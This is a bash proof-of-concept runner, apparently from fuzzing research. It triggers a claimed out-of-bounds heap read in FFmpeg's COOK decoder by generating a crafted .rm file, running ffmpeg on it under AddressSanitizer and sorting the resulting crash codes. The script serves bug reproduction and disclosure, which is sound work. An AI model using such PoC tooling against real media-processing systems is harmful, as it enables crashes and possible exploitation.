#!/usr/bin/env bash
# PoC runner for COOK OOB heap read via js_subband_start
# VULN 001: joint_decode() in libavcodec/cook.c lines 851-855

set -euo pipefail

POC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FFMPEG="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
INPUT="${POC_DIR}/vuln_001_input.rm"

echo "=== Step 1: Generate crafted .rm file ==="
python3 "${POC_DIR}/vuln_001_gen.py"
echo ""

echo "=== Step 2: Verify ffmpeg binary and check for ASAN ==="
ls -la "${FFMPEG}"
# Check if binary has ASAN instrumentation
if strings "${FFMPEG}" 2>/dev/null | grep -q "AddressSanitizer\|__asan_\|libasan"; then
    echo "[+] ASAN detected in binary"
else
    echo "[!] No ASAN symbols found in binary (may still work if linked dynamically)"
fi
echo ""

echo "=== Step 3: Run ffmpeg on crafted input ==="
echo "Command: ${FFMPEG} -i ${INPUT} -f null -"
echo ""

# Set ASAN options for better output
export ASAN_OPTIONS="halt_on_error=1:print_stacktrace=1:detect_leaks=0:abort_on_error=1"

set +e  # Don't exit on ffmpeg failure (crash is expected)
"${FFMPEG}" -i "${INPUT}" -f null - 2>&1
FFMPEG_EXIT=$?
set -e

echo ""
echo "=== Step 4: Results ==="
echo "ffmpeg exit code: ${FFMPEG_EXIT}"

if [ "${FFMPEG_EXIT}" -ne 0 ]; then
    if [ "${FFMPEG_EXIT}" -eq 1 ]; then
        echo "[?] ffmpeg exited with code 1 (may be normal error or ASAN-detected issue)"
    elif [ "${FFMPEG_EXIT}" -eq 134 ] || [ "${FFMPEG_EXIT}" -eq 6 ]; then
        echo "[!] SIGABRT (134/6) - likely ASAN abort or assertion failure"
    elif [ "${FFMPEG_EXIT}" -eq 139 ] || [ "${FFMPEG_EXIT}" -eq 11 ]; then
        echo "[!] SIGSEGV (139/11) - segmentation fault"
    else
        echo "[?] Non-zero exit: ${FFMPEG_EXIT}"
    fi
fi
